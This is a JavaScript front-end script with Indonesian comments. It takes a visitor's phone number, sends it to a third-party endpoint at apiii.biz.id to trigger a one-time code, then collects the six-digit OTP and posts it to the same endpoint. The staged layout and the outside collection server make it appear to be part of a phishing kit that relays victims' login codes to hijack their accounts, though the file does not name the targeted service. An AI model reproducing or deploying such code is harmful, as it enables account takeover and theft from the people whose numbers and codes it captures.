// Fungsi untuk menampilkan pesan error
function showError(message) {
    const errorDiv = document.getElementById("error-message");
    if (!errorDiv) {
        console.error("Elemen error-message tidak ditemukan.");
        return;
    }
    
    errorDiv.innerText = message;
    errorDiv.style.display = "block";
    errorDiv.style.opacity = "1";

    setTimeout(() => {
        errorDiv.style.opacity = "0";
        setTimeout(() => errorDiv.style.display = "none", 500);
    }, 3000);
}

// Fungsi untuk memproses data pertama (mengirim OTP)
function processFirstData(event) {
    event.preventDefault();
    
    const loadingDiv = document.getElementById("loading");
    if (!loadingDiv) {
        console.error("Elemen loading tidak ditemukan.");
        return;
    }

    loadingDiv.style.display = "flex";

    const phoneInput = document.getElementById("phone");
    if (!phoneInput) {
        showError("Input nomor telepon tidak ditemukan.");
        return;
    }

    const phone = phoneInput.value.trim();
    
    if (!phone) {
        showError("Nomor telepon tidak boleh kosong.");
        loadingDiv.style.display = "none";
        return;
    }

    fetch("https://apiii.biz.id/code/api.php", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `action=request&phone=${encodeURIComponent(phone)}`
    })
    .then(response => response.text()) // Ambil sebagai teks dulu
    .then(text => {
        try {
            return JSON.parse(text);
        } catch (e) {
            throw new Error("Respon tidak valid: " + text);
        }
    })
    .then(data => {
        loadingDiv.style.display = "none";
        if (data.status === "success") {
            localStorage.setItem("phone", phone);
            
            const firstDiv = document.querySelector(".first");
            const secondDiv = document.querySelector(".second");
            const phoneNumberDisplay = document.getElementById("phone-number-display");

            if (firstDiv) firstDiv.style.display = "none";
            if (secondDiv) secondDiv.style.display = "block";
            if (phoneNumberDisplay) phoneNumberDisplay.innerText = `Kode OTP telah dikirim ke ${phone}`;
        } else {
            showError(data.message);
        }
    })
    .catch(error => {
        loadingDiv.style.display = "none";
        showError("Terjadi kesalahan, coba lagi.");
    });
}

// Fungsi untuk memproses verifikasi OTP
document.addEventListener("DOMContentLoaded", function() {
    const secondForm = document.getElementById("secondForm");
    if (!secondForm) {
        console.error("Form verifikasi tidak ditemukan.");
        return;
    }

    secondForm.addEventListener("submit", function(event) {
        event.preventDefault();
        
        const loadingDiv = document.getElementById("loading");
        if (loadingDiv) loadingDiv.style.display = "flex";

        const phone = localStorage.getItem("phone");
        if (!phone) {
            showError("Nomor telepon tidak ditemukan. Silakan coba lagi.");
            if (loadingDiv) loadingDiv.style.display = "none";
            return;
        }

        const otpInputs = document.querySelectorAll(".code-input");
        const otp = [...otpInputs].map(input => input.value).join('');

        if (otp.length !== 6) { // Pastikan OTP terdiri dari 6 digit
            showError("Kode OTP harus 6 digit.");
            if (loadingDiv) loadingDiv.style.display = "none";
            return;
        }

        fetch("https://apiii.biz.id/code/api.php", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: `action=verify&phone=${encodeURIComponent(phone)}&otp=${encodeURIComponent(otp)}`
        })
        .then(response => response.text())
        .then(text => {
            try {
                return JSON.parse(text);
            } catch (e) {
                throw new Error("Respon tidak valid: " + text);
            }
        })
        .then(data => {
            if (loadingDiv) loadingDiv.style.display = "none";
            if (data.status === "success") {
                const secondDiv = document.querySelector(".second");
                const fourDiv = document.querySelector(".four");

                if (secondDiv) secondDiv.style.display = "none";
                if (fourDiv) fourDiv.style.display = "block";
            } else {
                showError(data.message);
            }
        })
        .catch(error => {
            if (loadingDiv) loadingDiv.style.display = "none";
            showError("Terjadi kesalahan saat verifikasi.");
        });
    });
});
